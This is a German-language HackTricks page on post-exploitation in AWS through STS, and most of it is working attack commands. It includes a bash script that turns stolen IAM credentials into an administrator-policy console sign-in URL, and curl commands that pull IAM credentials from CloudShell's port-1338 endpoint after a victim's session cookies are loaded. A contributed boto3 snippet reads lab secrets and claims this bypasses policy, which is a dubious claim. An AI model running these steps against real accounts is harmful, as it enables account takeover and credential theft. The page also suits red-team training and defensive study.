# AWS - STS Post Exploitation

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}

## STS

F√ºr weitere Informationen:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

#### Neue Methode Dezember 2024: Umgehung der Anforderung f√ºr den Webkonsole-Link, durch HTTPS-POST-Anfrage direkt an die SecretsManager-API, um Geheimnisse zu erhalten (kein Anmeldelink oder Webkonsole)

Gestern eingereicht, als PR f√ºr die bevorstehende Pr√ºfung (ARTE: ex16x41), jedoch sehe ich, dass der PR nicht angezeigt wird, vielleicht falsch eingereicht, versuchen wir es erneut:
Mit dieser Methode umgehen Sie vollst√§ndig die Anforderung, URLs zu √∂ffnen, Anmeldelinks zu formatieren oder sogar die CLI / Webkonsole zu verwenden.
Was haben wir hier also gemacht?
Ich habe dieses Skript geschrieben, das direkt mit der AWS Secrets Manager API interagiert, es ist absolut einfach und unkompliziert.
Wenn Sie das Skript ausf√ºhren, sendet es eine HTTPS-POST-Anfrage an den AWS Secrets Manager-Endpunkt
https://secretsmanager.<region>.amazonaws.com/
Die GetSecretValue-Anfrage wird als Teil der POST-Anfrage gesendet, authentifiziert mit SigV4-Signierung (verwaltet von boto3).
Secrets Manager verarbeitet die Anfrage:
AWS validiert die Anfrage gegen die IAM-Richtlinien, die an Ihren Benutzer oder Ihre Rolle angeh√§ngt sind (wie wir wissen, k√∂nnen wir den geheimen Wert nur √ºber die Webkonsole anzeigen)
Wenn erlaubt, gibt der Secrets Manager-Dienst den angeforderten geheimen Wert in der Antwort zur√ºck.
**POC-Demo:**
Der CLI-AWS-Befehl zum Abrufen des geheimen Wertes funktioniert nicht, da der Zugriff verweigert wird ->
In dem Bild k√∂nnen Sie jedoch die Einfachheit der Methode sehen, um das Flag direkt zu extrahieren, indem Sie die geheime ID kennen (dies haben wir in einer fr√ºheren Phase ermittelt, als wir mit dem Benutzerprofil angemeldet waren)
![image](https://github.com/user-attachments/assets/d05a1a96-04c0-4404-b4bd-dbfa93c6494b)
Hinweis: Ich denke, diese Methode kann universell verwendet werden, je nach Szenario, wenn die Richtlinie dies erlaubt (aber die Einschr√§nkungen der Richtlinie umgehen, die dies nicht √ºber die CLI erlaubt)
Dies kann also jederzeit verwendet werden, wenn eine Richtlinie dies erlaubt (als alternative Testoption)
Nebenbemerkung: neugierig auf andere Techniken, die Sie mit derselben Methode der direkten Interaktion mit der API des Dienstes und jetzt AWS CLI anwenden k√∂nnen, f√ºr jeden Prozess der Privilegieneskalation oder Post-Exploitation wie hier.
**Code:**
'''
Python
import boto3

session = boto3.Session(profile_name="lab6")
client = session.client("secretsmanager", region_name="us-east-1")

# Setzen Sie einen benutzerdefinierten User-Agent
client.meta.events.register(
'before-call.secretsmanager.GetSecretValue',
lambda params, **kwargs: params['headers'].update({'User-Agent': 'my-custom-tool'})
)

# Abrufen des geheimen Wertes direkt √ºber die secretsmanager API
response = client.get_secret_value(SecretId="flag_sts_lab_3")
print(response['SecretString'])
'''

### Von IAM-Credentials zur Konsole

Wenn Sie es geschafft haben, einige IAM-Credentials zu erhalten, k√∂nnten Sie daran interessiert sein, **auf die Webkonsole zuzugreifen** mit den folgenden Tools.\
Beachten Sie, dass der Benutzer/die Rolle die Berechtigung **`sts:GetFederationToken`** haben muss.

#### Benutzerdefiniertes Skript

Das folgende Skript verwendet das Standardprofil und einen Standard-AWS-Standort (nicht gov und nicht cn), um Ihnen eine signierte URL zu geben, die Sie verwenden k√∂nnen, um sich in der Webkonsole anzumelden:

{% code overflow="wrap" %}
```bash
# Get federated creds (you must indicate a policy or they won't have any perms)
## Even if you don't have Admin access you can indicate that policy to make sure you get all your privileges
## Don't forget to use [--profile <prof_name>] in the first line if you need to
output=$(aws sts get-federation-token --name consoler --policy-arns arn=arn:aws:iam::aws:policy/AdministratorAccess)

if [ $? -ne 0 ]; then
echo "The command 'aws sts get-federation-token --name consoler' failed with exit status $status"
exit $status
fi

# Parse the output
session_id=$(echo $output | jq -r '.Credentials.AccessKeyId')
session_key=$(echo $output | jq -r '.Credentials.SecretAccessKey')
session_token=$(echo $output | jq -r '.Credentials.SessionToken')

# Construct the JSON credentials string
json_creds=$(echo -n "{\"sessionId\":\"$session_id\",\"sessionKey\":\"$session_key\",\"sessionToken\":\"$session_token\"}")

# Define the AWS federation endpoint
federation_endpoint="https://signin.aws.amazon.com/federation"

# Make the HTTP request to get the sign-in token
resp=$(curl -s "$federation_endpoint" \
--get \
--data-urlencode "Action=getSigninToken" \
--data-urlencode "SessionDuration=43200" \
--data-urlencode "Session=$json_creds"
)
signin_token=$(echo -n $resp | jq -r '.SigninToken' | tr -d '\n' | jq -sRr @uri)



# Give the URL to login
echo -n "https://signin.aws.amazon.com/federation?Action=login&Issuer=example.com&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2F&SigninToken=$signin_token"
```
{% endcode %}

#### aws\_consoler

Sie k√∂nnen **einen Webkonsole-Link generieren** mit [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).
```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #This will generate a link to login into the console
```
{% hint style="warning" %}
Stellen Sie sicher, dass der IAM-Benutzer die Berechtigung `sts:GetFederationToken` hat oder eine Rolle zum √úbernehmen bereitstellt.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) ist ein Tool, um AWS-Anmeldeinformationen sicher zu speichern und in einer Entwicklungsumgebung darauf zuzugreifen.
```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Execute aws cli with jonsmith creds
aws-vault login jonsmith # Open a browser logged as jonsmith
```
{% hint style="info" %}
Sie k√∂nnen auch **aws-vault** verwenden, um eine **Browser-Konsole-Sitzung** zu erhalten.
{% endhint %}

#### Von der Konsole zu IAM-Credentials

[**Urspr√ºnglich in diesem Beitrag entdeckt**](https://blog.christophetd.fr/retrieving-aws-security-credentials-from-the-aws-console/), Wenn es Ihnen gelingt, Zugriff auf eine Webkonsole zu kompromittieren (vielleicht haben Sie Cookies gestohlen und konnten nicht auf den .aws-Ordner zugreifen), k√∂nnen Sie einige IAM-Token-Credentials f√ºr diesen Benutzer √ºber **CloudShell** erhalten.

CloudShell gibt IAM-Credentials √ºber einen **undokumentierten Endpunkt auf Port 1338** preis. Nachdem Sie die Sitzungscookies des Opfers in Ihren Browser geladen haben, k√∂nnen Sie zu CloudShell navigieren und die folgenden Befehle ausf√ºhren, um IAM-Credentials zu erhalten.
```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```
{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtze HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
